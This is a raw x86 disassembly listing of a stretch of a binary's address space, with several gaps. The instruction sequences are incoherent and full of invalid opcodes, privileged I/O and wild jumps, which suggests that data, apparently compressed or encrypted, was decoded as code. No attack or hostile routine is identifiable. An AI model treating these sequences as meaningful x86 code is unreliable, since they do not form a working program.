  417873:	sbb    DWORD PTR [ebx+0x77],ecx
  417876:	jns    0x417846
  417878:	in     al,dx
  417879:	and    eax,0x45b7053e
  41787e:	mov    ebx,0x1130e6d0
  417883:	(bad)  
  417884:	mov    eax,0x6675d21a
  417889:	ins    BYTE PTR es:[edi],dx
  41788a:	mov    ecx,0x191f9151
  41788f:	pop    ds
  417890:	or     DWORD PTR [ebx],edx
  417892:	retf   
  417893:	inc    ebx
  417894:	mov    cl,0xc1
  417896:	cli    
  417897:	cmp    al,BYTE PTR [esi+0x5643e81d]
  41789d:	mov    ebp,0xcaa2967d
  4178a2:	call   ebx
  4178a4:	xchg   ecx,eax
  4178a5:	pop    ebx
  4178a6:	test   BYTE PTR [ecx-0x9],bh
  4178a9:	xor    DWORD PTR ds:0x512dec7a,0x632528a
  4178b3:	call   0x7fef5866
  4178b8:	or     al,0x49
  4178ba:	xchg   esp,eax
  4178bb:	jb     0x417876
  4178bd:	in     al,0x27
  4178bf:	mov    ch,0x3a
  4178c1:	xor    eax,0xaf8538b
  4178c6:	sub    ebx,ecx
  4178c8:	mov    dh,0x4d
  4178ca:	or     eax,0xd06af5e7
  4178cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178d0:	cmp    DWORD PTR [edi-0x3c3971e5],0x1
  4178d7:	fwait
  4178d8:	rcl    BYTE PTR [esi+0x68952503],cl
  4178de:	ss pop ebp
  4178e0:	push   ebx
  4178e1:	xchg   ebx,eax
  4178e2:	jmp    0xa906c474
  4178e7:	js     0x4178d8
  4178e9:	xchg   esi,eax
  4178ea:	add    eax,0x4053fcdd
  4178ef:	stos   BYTE PTR es:[edi],al
  4178f0:	ins    BYTE PTR es:[edi],dx
  4178f1:	test   DWORD PTR [edx-0x32],edi
  4178f4:	inc    esi
  4178f5:	std    
  4178f6:	mov    edx,0xdc98b133
  4178fb:	test   eax,0x8c4a58f0
  417900:	xchg   BYTE PTR [eax],dh
  417902:	iret   
  417903:	outs   dx,DWORD PTR ds:[esi]
  417904:	or     eax,0xb62b3e66
  417909:	xchg   ecx,eax
  41790a:	mov    ebp,0xab39f0e7
  41790f:	imul   eax,DWORD PTR [eax],0x0
	...
  417972:	add    BYTE PTR [eax],al
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	sbb    DWORD PTR [esi],esi
  417982:	mov    eax,ds:0xf9784e
  417987:	add    BYTE PTR [ecx+eax*1],al
  41798a:	add    BYTE PTR [eax],al
  41798c:	pop    ds
  41798d:	ds push edx
  41798f:	sbb    cl,dh
  417991:	shl    DWORD PTR [esp+eiz*4+0x4a],0x55
  417996:	sbb    DWORD PTR [eax],eax
  417998:	test   al,0x98
  41799a:	scas   eax,DWORD PTR es:[edi]
  41799b:	add    al,0xb8
  41799d:	pusha  
  41799e:	(bad)
  4179a1:	jne    0x417950
  4179a3:	jmp    0x417988
  4179a5:	test   al,0xf1
  4179a7:	push   eax
  4179a8:	sti    
  4179a9:	and    bh,ch
  4179ab:	rol    ch,0xe
  4179ae:	pushf  
  4179af:	add    bh,BYTE PTR [ecx+ecx*1]
  4179b2:	std    
  4179b3:	jg     0x417972
  4179b5:	cs (bad) 
  4179b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179b8:	push   0xffffffc5
  4179ba:	mov    ds:0x46519552,eax
  4179bf:	cmp    eax,0x217a83f6
  4179c4:	mov    ds:0x71682bde,al
  4179c9:	loop   0x4179fa
  4179cb:	std    
  4179cc:	inc    esi
  4179cd:	add    eax,0xb5426b25
  4179d2:	out    dx,eax
  4179d3:	pop    esi
  4179d4:	push   0xfff17b30
  4179d9:	jmp    0x41797a
  4179db:	sar    BYTE PTR [esp+edi*4+0xa],0xbb
  4179e0:	pop    ecx
  4179e1:	jmp    0x625733ac
  4179e6:	out    0xbd,al
  4179e8:	mov    WORD PTR [ebx],gs
  4179ea:	(bad)  
  4179eb:	out    dx,eax
  4179ec:	and    al,0x31
  4179ee:	or     al,0x24
  4179f0:	sbb    al,bh
  4179f2:	fiadd  WORD PTR [esi-0x6765f14e]
  4179f8:	scas   al,BYTE PTR es:[edi]
  4179f9:	adc    dl,BYTE PTR [edi+0x6c]
  4179fc:	js     0x417a75
  4179fe:	daa    
  4179ff:	cmp    al,0xd5
  417a01:	rcl    DWORD PTR fs:[esi-0x257361d7],cl
  417a08:	std    
  417a09:	pop    esp
  417a0a:	or     DWORD PTR ds:0x1693c165,esi
  417a10:	sbb    ah,BYTE PTR [eax]
  417a12:	and    eax,esp
  417a14:	push   es
  417a15:	lods   al,BYTE PTR ds:[esi]
  417a16:	iret   
  417a17:	sahf   
  417a18:	retf   
  417a19:	inc    edx
  417a1a:	into   
  417a1b:	sub    DWORD PTR [esi],esi
  417a1d:	jle    0x4179ca
  417a1f:	add    DWORD PTR [edi+0x6d862569],esp
  417a25:	sbb    BYTE PTR ds:0x2117f0e3,cl
  417a2b:	vpminsw xmm1{k2},xmm3,QWORD PTR [edx-0x58e5a4ed]{1to2}
  417a35:	gs popf 
  417a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a38:	inc    eax
  417a39:	not    DWORD PTR [esi+0x52]
  417a3c:	lahf   
  417a3d:	test   BYTE PTR [ecx+edx*1+0x7a],0x45
  417a42:	enter  0x2456,0x7b
  417a46:	dec    ebp
  417a47:	xchg   BYTE PTR [edx+0x67291d61],cl
  417a4d:	lea    ecx,[eax+0x97843b]
  417a53:	jmp    0x63faac74
  417a58:	mov    bl,0xc9
  417a5a:	pop    eax
  417a5b:	pushf  
  417a5c:	cld    
  417a5d:	add    ebx,DWORD PTR [edi-0x7df4ab20]
  417a63:	inc    esi
  417a64:	in     eax,0xad
  417a66:	out    dx,eax
  417a67:	int    0x5e
  417a69:	adc    BYTE PTR [ebx],bl
  417a6b:	lock iret 
  417a6d:	mov    ecx,0x4e6e1998
  417a72:	cwde   
  417a73:	xor    ecx,DWORD PTR [esi-0x6c004f2c]
  417a79:	cmp    ebp,0x3e
  417a7c:	add    ah,al
  417a7e:	aas    
  417a7f:	and    eax,0xed5763f7
  417a84:	in     al,0xe4
  417a86:	fld    QWORD PTR [ebx]
  417a88:	shl    BYTE PTR [esi-0x33],cl
  417a8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a8c:	add    DWORD PTR [esi],ecx
  417a8e:	sbb    cl,ch
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx+0x44267ae3]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	add    DWORD PTR [edi],ecx
  417b0e:	cli    
  417b0f:	loopne 0x417b4b
  417b11:	push   es
  417b12:	add    al,0x5d
  417b14:	inc    edi
  417b15:	jge    0x417ae6
  417b17:	sbb    DWORD PTR [ebx],eax
  417b19:	dec    ebx
  417b1a:	clc    
  417b1b:	pop    ss
  417b1c:	push   0xa61e66e2
  417b21:	test   eax,0x9bae3e0d
  417b26:	imul   esp,DWORD PTR [ebp+0x2c3fbb7c],0xffffffeb
  417b2d:	int    0xfc
  417b2f:	pop    ds
  417b30:	int3   
  417b31:	out    dx,eax
  417b32:	dec    esi
  417b33:	in     al,0x9a
  417b35:	out    0xa3,al
  417b37:	out    dx,eax
  417b38:	call   0x99ce:0xb362ee4c
  417b3f:	pop    ebx
  417b40:	jmp    edx
  417b42:	rcl    dl,1
  417b44:	sbb    ecx,edx
  417b46:	aam    0xff
  417b48:	test   BYTE PTR [edi+0x8ee0030],bh
  417b4e:	jl     0x417b48
  417b50:	sti    
  417b51:	pop    ecx
  417b52:	sub    ecx,esi
  417b54:	shr    DWORD PTR [edx-0x219f9da5],cl
  417b5a:	ds (bad) 
  417b5c:	out    0xa,al
  417b5e:	mov    ah,0xac
  417b60:	retf   0xf8f
  417b63:	xchg   BYTE PTR [esi],ah
  417b65:	not    BYTE PTR [esi-0x1]
  417b68:	ret    
  417b69:	xlat   BYTE PTR ds:[ebx]
  417b6a:	std    
  417b6b:	xchg   ebp,eax
  417b6c:	inc    eax
  417b6d:	xchg   esp,eax
  417b6e:	sahf   
  417b6f:	xchg   BYTE PTR [esi-0x55799f8e],al
  417b75:	sub    ebx,DWORD PTR [edx-0x47b3d988]
  417b7b:	(bad)
  417b7e:	add    eax,0x96ec7cc5
  417b83:	pop    ebx
  417b84:	iret   
  417b85:	fist   DWORD PTR [edx-0x22]
  417b88:	jo     0x417b93
  417b8a:	xor    BYTE PTR [eax+0x66],dl
  417b8d:	mov    ah,0x2d
  417b8f:	jne    0x417bf2
  417b91:	pusha  
  417b92:	hlt    
  417b93:	int    0xb6
  417b95:	out    dx,al
  417b96:	xchg   BYTE PTR [edi+0x42],dh
  417b99:	dec    eax
  417b9a:	sbb    DWORD PTR [eax-0xb],0x5e
  417b9e:	fstp   DWORD PTR [ecx+0x64]
  417ba1:	jnp    0x417bfb
  417ba3:	cmc    
  417ba4:	(bad)  
  417ba5:	cmp    dh,BYTE PTR ds:0xfb930a48
  417bab:	icebp  
  417bac:	mov    esi,0x92dc6e02
  417bb1:	xchg   BYTE PTR [ecx-0x36],bl
  417bb4:	cli    
  417bb5:	outs   dx,DWORD PTR ds:[esi]
  417bb6:	idiv   DWORD PTR [ecx+0x60]
  417bb9:	and    eax,0x6a4b21ca
  417bbe:	xor    al,BYTE PTR [esi-0x3accf01e]
  417bc4:	scas   eax,DWORD PTR es:[edi]
  417bc5:	ins    DWORD PTR es:[edi],dx
  417bc6:	sar    DWORD PTR [edi],1
  417bc8:	sub    BYTE PTR [esi-0x14],bl
  417bcb:	jmp    0x417bcd
  417bcd:	daa    
  417bce:	push   ds
  417bcf:	jg     0x417bd0
  417bd1:	cmp    BYTE PTR [esi+ebp*4+0x6aa3c6cc],bh
  417bd8:	adc    al,0x60
  417bda:	inc    ebp
  417bdb:	arpl   WORD PTR [edi+eiz*1+0x54518333],di
  417be2:	adc    edx,DWORD PTR ds:0x6ede60f0
  417be8:	imul   BYTE PTR [ebp-0xa]
  417beb:	les    edx,FWORD PTR [ecx+0x47]
  417bee:	inc    esp
  417bef:	add    BYTE PTR [edi-0x4b7bd83f],0x86
  417bf6:	jmp    0xc158:0xf956873f
  417bfd:	jmp    0x4c18:0x79eb7f0e
  417c04:	fld    TBYTE PTR [esp+edx*8+0x55]
  417c08:	jno    0x417c2d
  417c0a:	je     0x417be9
  417c0c:	cs add ecx,eax
  417c0f:	fadd   QWORD PTR [eax]
	...
  417c71:	add    BYTE PTR [eax],al
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x6c
  417c81:	lahf   
  417c82:	icebp  
  417c83:	dec    eax
  417c84:	cmp    bl,0x0
  417c87:	add    BYTE PTR [ecx+eax*1],al
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	jno    0x417c2e
  417c8e:	pushf  
  417c8f:	lock or al,0xbd
  417c92:	imul   ecx,DWORD PTR [esi],0xb6315705
  417c98:	dec    ecx
  417c9a:	lods   al,BYTE PTR ds:[esi]
  417c9b:	(bad)  
  417c9c:	je     0x417ce2
  417c9e:	xchg   esp,eax
  417c9f:	mov    edx,gs
  417ca1:	xchg   edx,eax
  417ca2:	pop    edx
  417ca3:	(bad)  
  417ca4:	dec    ecx
  417ca5:	mov    bh,BYTE PTR [ecx-0x5a]
  417ca8:	in     al,0xd7
  417caa:	pop    ebp
  417cab:	and    BYTE PTR [edi],ah
  417cad:	xor    ch,BYTE PTR [ebp-0x54]
  417cb0:	jbe    0x417c69
  417cb2:	scas   al,BYTE PTR es:[edi]
  417cb3:	sbb    edx,DWORD PTR [edx+0x46]
  417cb6:	pop    es
  417cb7:	int3   
  417cb8:	jns    0x417c6d
  417cba:	adc    BYTE PTR [ecx-0x61eed7b],dh
  417cc0:	inc    ebp
  417cc1:	jns    0x417cfe
  417cc3:	imul   ebp
  417cc5:	and    BYTE PTR fs:[ebx],bh
  417cc8:	xchg   BYTE PTR [ebx*8+0x159ff1f0],cl
  417ccf:	add    al,0x1f
  417cd1:	out    dx,eax
  417cd2:	test   DWORD PTR [edx+eax*8-0x6232291c],ebx
  417cd9:	dec    ecx
  417cda:	jne    0x417c66
  417cdc:	ficomp WORD PTR [ebx-0x7523173e]
  417ce2:	jno    0x417cf8
  417ce4:	xchg   esp,eax
  417ce5:	ja     0x417cc8
  417ce7:	mov    BYTE PTR [eax+0x4e68387b],ah
  417ced:	xor    dl,dl
  417cef:	and    al,0x8d
  417cf1:	je     0x417cee
  417cf3:	imul   ebx,esp,0x5f0eb04c
  417cf9:	fs ss mov esp,0xb150a894
  417d00:	lods   al,BYTE PTR ds:[esi]
  417d01:	pop    esp
  417d02:	inc    eax
  417d03:	xchg   BYTE PTR [esi-0x6a986d64],ch
  417d09:	mov    eax,ds:0x5fe9ad3b
  417d0e:	inc    eax
  417d0f:	mov    ds:0x66b949ff,al
  417d14:	sar    BYTE PTR [ebp+0x63144d8],cl
  417d1a:	aas    
  417d1b:	jno    0x417d7a
  417d1d:	shl    DWORD PTR [edi],cl
  417d1f:	push   ebx
  417d20:	inc    esp
  417d21:	(bad)  
  417d22:	cmp    al,0x70
  417d24:	and    eax,0xacf78c2d
  417d29:	push   esi
  417d2a:	pop    ecx
  417d2b:	sbb    DWORD PTR [esp+eiz*2],ebp
  417d2e:	jo     0x417ccd
  417d30:	lahf   
  417d31:	adc    al,0xd7
  417d33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d34:	lods   eax,DWORD PTR ds:[esi]
  417d35:	inc    edx
  417d36:	scas   eax,DWORD PTR es:[edi]
  417d37:	sub    eax,0x2489745a
  417d3c:	cdq    
  417d3d:	imul   DWORD PTR [eax+0x62d6ae50]
  417d43:	push   ds
  417d44:	ins    DWORD PTR es:[edi],dx
  417d45:	push   ebp
  417d46:	fcmovnu st,st(6)
  417d48:	jo     0x417dbb
  417d4a:	xchg   ebp,eax
  417d4b:	add    cl,BYTE PTR [edi]
  417d4d:	adc    dh,BYTE PTR [eax+0x42]
  417d50:	xchg   esp,eax
  417d51:	xchg   ebx,eax
  417d52:	dec    ecx
  417d53:	sub    ecx,DWORD PTR [edx+0x12]
  417d56:	xchg   edi,eax
  417d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d58:	mov    esp,0xee7d378a
  417d5d:	ret    0x66ad
  417d60:	adc    eax,0x65d007d8
  417d65:	stos   BYTE PTR es:[edi],al
  417d66:	add    al,0xe
  417d68:	mov    ch,0x91
  417d6a:	sub    eax,DWORD PTR [ecx]
  417d6c:	pop    esi
  417d6d:	cld    
  417d6e:	in     al,0xf9
  417d70:	cmp    BYTE PTR [ecx+eax*1-0x43],cl
  417d74:	sub    al,0xf3
  417d76:	adc    eax,0xd01c5048
  417d7b:	pop    ebx
  417d7c:	cld    
  417d7d:	xchg   esi,eax
  417d7e:	aad    0xbd
  417d80:	aas    
  417d81:	or     al,0x65
  417d83:	fdiv   st(3),st
  417d85:	dec    edi
  417d86:	pop    ebx
  417d87:	add    BYTE PTR [ecx],ah
  417d89:	fwait
  417d8a:	nop
  417d8b:	addr16 hlt 
  417d8d:	addr16 or ecx,ebx
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	inc    ebx
  417e01:	je     0x417e34
  417e03:	ja     0x417d89
  417e05:	cld    
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	add    bl,ch
  417e0e:	adc    eax,0x857c16f4
  417e13:	xlat   BYTE PTR ds:[ebx]
  417e14:	dec    eax
  417e15:	repnz xchg ebx,eax
  417e17:	inc    edi
  417e18:	cmp    al,0xe8
  417e1a:	mov    dl,0x47
  417e1c:	xchg   ecx,eax
  417e1d:	xchg   ebx,eax
  417e1e:	and    eax,0x1fded8eb
  417e23:	addr16 jge 0x417e51
  417e26:	dec    esi
  417e27:	jecxz  0x417e69
  417e29:	pop    esi
  417e2a:	jmp    0x1afa:0xb8fd81aa
  417e31:	mov    edx,0x869c6c04
  417e36:	rcl    BYTE PTR [esi-0x5b],0x93
  417e3a:	cld    
  417e3b:	mov    eax,ds:0x31ee7c2b
  417e40:	or     BYTE PTR [esi+0x53dc8b3],ch
  417e46:	dec    edx
  417e47:	adc    eax,0x47de4529
  417e4c:	sub    al,0x4c
  417e4e:	je     0x417e55
  417e50:	dec    ebx
  417e51:	xor    BYTE PTR [eax],0x7e
  417e54:	xor    DWORD PTR [ebp+0xf6d3f02],ecx
  417e5a:	nop
  417e5b:	xor    BYTE PTR [edx],dl
  417e5d:	call   0x83000f25
  417e62:	sbb    DWORD PTR [eax],eax
  417e64:	xchg   edx,eax
  417e65:	(bad)  
  417e66:	sbb    al,0xb6
  417e68:	sbb    eax,0x93433d37
  417e6d:	mov    ebp,0x22cc1a97
  417e72:	test   cl,0xe7
  417e75:	lock push ds
  417e77:	push   ebx
  417e78:	pop    edi
  417e79:	jle    0x417e49
  417e7b:	jnp    0x417e03
  417e7d:	popf   
  417e7e:	inc    ebx
  417e7f:	or     al,0xb6
  417e81:	cmc    
  417e82:	fstp   QWORD PTR [edx+0x52]
  417e85:	add    dh,dl
  417e87:	or     WORD PTR [edx+0x578ac893],0x7f
  417e8f:	cdq    
  417e90:	sub    edx,DWORD PTR [esi+ecx*2-0x10]
  417e94:	dec    esp
  417e95:	pop    esi
  417e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e97:	mov    DWORD PTR [eax+0xa1eb3e7],ecx
  417e9d:	adc    BYTE PTR [edx+ebx*8-0x5c],al
  417ea1:	int    0x96
  417ea3:	int3   
  417ea4:	mov    bh,0xdf
  417ea6:	xor    bh,dl
  417ea8:	pop    ebp
  417ea9:	xchg   ebx,eax
  417eaa:	dec    edx
  417eab:	adc    al,0x87
  417ead:	xchg   BYTE PTR [eax+0x7e],bl
  417eb0:	test   BYTE PTR [ebx+0x37],dh
  417eb3:	ins    DWORD PTR es:[edi],dx
  417eb4:	mov    edi,0x5cfea702
  417eb9:	and    BYTE PTR [esi],bh
  417ebb:	neg    bh
  417ebd:	shl    BYTE PTR [edi],1
  417ebf:	dec    esi
  417ec0:	(bad)  
  417ec2:	lea    esi,[esi-0x29]
  417ec5:	ins    DWORD PTR es:[edi],dx
  417ec6:	in     al,dx
  417ec7:	push   eax
  417ec8:	lahf   
  417ec9:	sar    DWORD PTR [ecx],0x9c
  417ecc:	xchg   ebp,eax
  417ecd:	dec    eax
  417ece:	(bad)  
  417ecf:	xor    esi,DWORD PTR [ecx]
  417ed1:	sub    esi,DWORD PTR [esi]
  417ed3:	mov    esi,0xcde5266c
  417ed8:	inc    edx
  417ed9:	inc    edi
  417eda:	cmc    
  417edb:	ret    
  417edc:	add    ch,BYTE PTR [ebx]
  417ede:	inc    ebp
  417edf:	retf   0x8ab9
  417ee2:	repz not BYTE PTR [edi+edi*2]
  417ee6:	sbb    bh,BYTE PTR [ebx]
  417ee8:	mov    dl,0x28
  417eea:	fucomi st,st(2)
  417eec:	push   eax
  417eed:	mov    eax,ds:0x39f39044
  417ef2:	xlat   BYTE PTR ds:[ebx]
  417ef3:	dec    ecx
  417ef4:	lea    esi,[edx+eiz*4-0x6cd69327]
  417efb:	stos   DWORD PTR es:[edi],eax
  417efc:	fcomi  st,st(7)
  417efe:	leave  
  417eff:	jno    0x417e90
  417f01:	mov    esi,0xe1cb5b4a
  417f06:	outs   dx,DWORD PTR ds:[esi]
  417f07:	ror    DWORD PTR [edi-0x1f],0x7f
  417f0b:	js     0x417eba
  417f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f0e:	retf   0x5e
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	adc    DWORD PTR [ecx*1+0xfd8847],0x10400
  417f8b:	add    BYTE PTR [ebx+0x5d],bh
  417f8e:	cmc    
  417f8f:	jecxz  0x417fed
  417f91:	test   al,0x6c
  417f93:	ja     0x417fc4
  417f95:	push   edi
  417f96:	in     al,dx
  417f97:	out    0x3f,eax
  417f99:	repnz lods eax,DWORD PTR ds:[esi]
  417f9b:	or     BYTE PTR [eax+0x7a],dl
  417f9e:	bnd jl 0x417f5f
  417fa1:	cmp    edx,DWORD PTR [edi+ecx*2]
  417fa4:	inc    esi
  417fa5:	mov    cs,WORD PTR [esi+0x7b6e5746]
  417fab:	pushf  
  417fac:	xchg   edx,eax
  417fad:	data16 fmul st,st(3)
  417fb0:	pop    eax
  417fb1:	daa    
  417fb2:	cmp    cl,dh
  417fb4:	out    0x43,al
  417fb6:	repz inc esp
  417fb8:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  417fba:	pop    ds
  417fbb:	test   DWORD PTR [edi+0x62],ecx
  417fbe:	les    edx,FWORD PTR [eax-0x1f20039]
  417fc4:	pop    ss
  417fc5:	adc    eax,0xaf3b0068
  417fca:	dec    ecx
  417fcb:	loop   0x417f8a
  417fcd:	sti    
  417fce:	inc    ecx
  417fcf:	mov    ch,0x6f
  417fd1:	sub    al,0xaa
  417fd3:	jmp    0x2c773b3
  417fd8:	add    ah,0xd4
  417fdb:	add    bh,BYTE PTR [esp+ebx*1+0x4360bb3d]
  417fe2:	dec    eax
  417fe3:	add    edx,esp
  417fe5:	arpl   WORD PTR [esi],ax
  417fe7:	iret   
  417fe8:	sub    DWORD PTR [esi-0x65],ebp
  417feb:	mov    DWORD PTR [esi-0x41],ecx
  417fee:	sbb    BYTE PTR [eax+0x3dc577a6],al
  417ff4:	adc    al,0x44
  417ff6:	cmp    BYTE PTR [ecx+0x56],al
  417ff9:	fdiv   DWORD PTR [ecx]
  417ffb:	pop    es
  417ffc:	repnz aaa 
  417ffe:	test   al,0x44
  418000:	mov    ds:0xc9c991dd,eax
  418005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418006:	pop    edx
  418007:	mov    dh,0xa6
  418009:	xchg   ebx,eax
  41800a:	add    BYTE PTR [edx+0x321317cb],0xa0
  418011:	sub    eax,0x4eb607bf
  418016:	(bad)  
  418017:	ds or  ah,dh
  41801a:	out    dx,eax
  41801b:	add    bl,dh
  41801d:	sub    al,0xbc
  41801f:	rcr    BYTE PTR ds:0x1df44b72,0x6e
  418026:	ret    
  418027:	stc    
  418028:	and    al,ch
  41802a:	sbb    eax,0x7348f2f6
  41802f:	push   edx
  418030:	jmp    0x3992:0xcb09aba
  418037:	(bad)  
  418038:	fs inc ecx
  41803a:	mov    cl,0x73
  41803c:	jle    0x4180bd
  41803e:	fmul   DWORD PTR [esi-0x6fbf9c19]
  418044:	add    edx,DWORD PTR [edx+0x6951e395]
  41804a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41804b:	mov    edi,0xd40321d4
  418050:	sbb    bl,bl
  418052:	scas   eax,DWORD PTR es:[edi]
  418053:	or     edi,0x2b89da6d
  418059:	xchg   ebp,eax
  41805a:	xchg   ebp,eax
  41805b:	cmp    BYTE PTR [ebx-0x11ff1b27],ah
  418061:	in     eax,0x27
  418063:	dec    edi
  418064:	or     ecx,DWORD PTR [edi-0x23a52d93]
  41806a:	(bad)  
  41806b:	loopne 0x418023
  41806d:	dec    ebx
  41806e:	jp     0x41800f
  418070:	and    BYTE PTR [esi-0x5e163fce],al
  418076:	aad    0x92
  418078:	sbb    eax,0xd4acb18e
  41807d:	inc    edi
  41807f:	icebp  
  418080:	out    0x4e,eax
  418082:	fbld   TBYTE PTR [ecx]
  418084:	push   DWORD PTR [esi+0x24ac929]
  41808a:	shr    BYTE PTR [edi-0x45831a1e],cl
	...
  4180f4:	test   eax,0xff456b7e
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x932fdebc,eax
  418101:	mov    ah,0x9c
  418103:	pop    es
  418104:	mov    esi,?
  418106:	add    BYTE PTR [eax],al
  418108:	add    al,0x1
  41810a:	add    BYTE PTR [eax],al
  41810c:	jne    0x4180b7
  41810e:	fnstsw WORD PTR [edx+0x60ac06a]
  418114:	test   BYTE PTR [esi],0x1
  418117:	repz cdq 
  418119:	repz push ss
  41811b:	rcl    eax,cl
  41811d:	gs dec ebx
  41811f:	test   al,0xdf
  418121:	fiadd  DWORD PTR [edi]
  418123:	inc    edi
  418124:	stc    
  418125:	(bad)  
  418126:	fcomp  QWORD PTR [ebp-0x1ee4eb23]
  41812c:	mov    eax,edx
  41812e:	fmulp  st(5),st
  418130:	iret   
  418131:	xor    esp,DWORD PTR ds:0xe748fb6b
  418137:	aaa    
  418138:	jp     0x418147
  41813a:	xchg   esp,eax
  41813b:	cmp    DWORD PTR [ecx-0x12fff5ba],0xffffffb6
  418142:	xor    BYTE PTR [ecx-0x1e],dh
  418145:	iret   
  418146:	and    eax,DWORD PTR [eax+0x31]
  418149:	nop
  41814a:	retf   
  41814b:	sbb    bh,BYTE PTR [esi+0x71]
  41814e:	jno    0x4181ba
  418150:	inc    edx
  418151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418152:	jae    0x418150
  418154:	lds    edx,FWORD PTR [eax-0x3b]
  418157:	(bad)  
  418158:	pop    ds
  418159:	push   0xb
  41815b:	cmp    DWORD PTR [ecx+0x22],ebp
  41815e:	imul   dl
  418160:	cdq    
  418161:	xchg   esp,eax
  418162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418163:	mov    dl,0xaa
  418165:	and    al,0x9c
  418167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418168:	jg     0x418181
  41816a:	jb     0x41817c
  41816c:	and    al,0x6d
  41816e:	jmp    0xa6ec:0xfc48892b
  418175:	rol    DWORD PTR [esi+0x29865d50],1
  41817b:	imul   ebx,DWORD PTR [ebp+eax*2+0x4a],0x2c33617d
  418183:	push   ebx
  418184:	loope  0x4181da
  418186:	adc    al,0x60
  418188:	jp     0x418195
  41818a:	jmp    0x418206
  41818c:	push   esp
  41818d:	push   ss
  41818e:	or     al,0xe7
  418190:	out    dx,eax
  418191:	int    0xb1
  418193:	mov    ss,WORD PTR ss:[edi+0x4e]
  418197:	jnp    0x41811c
  418199:	fcmovne st,st(6)
  41819b:	add    BYTE PTR ds:0xd3d0b081,ch
  4181a1:	out    dx,eax
  4181a2:	or     DWORD PTR [esi-0x62],esp
  4181a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181a6:	(bad)  
  4181a7:	imul   ecx,DWORD PTR [edx+edx*1],0xffffff84
  4181ab:	sub    eax,0xc92c67a1
  4181b0:	xor    al,0x6f
  4181b2:	in     al,0x6b
  4181b4:	inc    esi
  4181b5:	mov    WORD PTR [edx],ss
  4181b7:	out    0xd5,eax
  4181b9:	lock fnsave [ebp-0x3a047dd4]
  4181c0:	or     eax,0x6b566adb
  4181c5:	mov    BYTE PTR [ecx-0x6f1919b0],dh
  4181cb:	int    0x76
  4181cd:	popf   
  4181ce:	mov    al,ds:0x6f60517e
  4181d3:	mov    ch,0xca
  4181d5:	ins    BYTE PTR es:[edi],dx
  4181d6:	fistp  QWORD PTR [edx*8+0xd476a0b]
  4181dd:	outs   dx,DWORD PTR ds:[esi]
  4181de:	loopne 0x41818e
  4181e0:	mov    ah,0x96
  4181e2:	mov    al,0x57
  4181e4:	pop    eax
  4181e5:	in     eax,0x2b
  4181e7:	cmc    
  4181e8:	cmp    eax,0x53a86e78
  4181ed:	adc    eax,DWORD PTR [edi+0x50]
  4181f0:	rol    DWORD PTR [ecx*1+0x35096cbe],0xdf
  4181f8:	mov    dh,0x7
  4181fa:	fadd   QWORD PTR [esp+eax*4-0x7d76f3b6]
  418201:	fs push bx
  418204:	clc    
  418205:	popa   
  418206:	xchg   esp,eax
  418207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418208:	cmp    esi,edi
  41820a:	nop
  41820b:	into   
  41820c:	fisub  WORD PTR [ecx+0x421f]
	...
  418272:	add    BYTE PTR [eax],al
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0xba22b8d6
  418282:	push   es
  418283:	pop    eax
  418284:	nop
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	retf   
  41828d:	repnz aad 0x1e
  418290:	jno    0x418230
  418292:	adc    edx,eax
  418294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418295:	lea    edi,[eax+0x1aa5ec75]
  41829b:	dec    edi
  41829c:	or     dl,BYTE PTR [ecx+0x6b40e36f]
  4182a2:	mov    ch,BYTE PTR [edi-0x40cbae20]
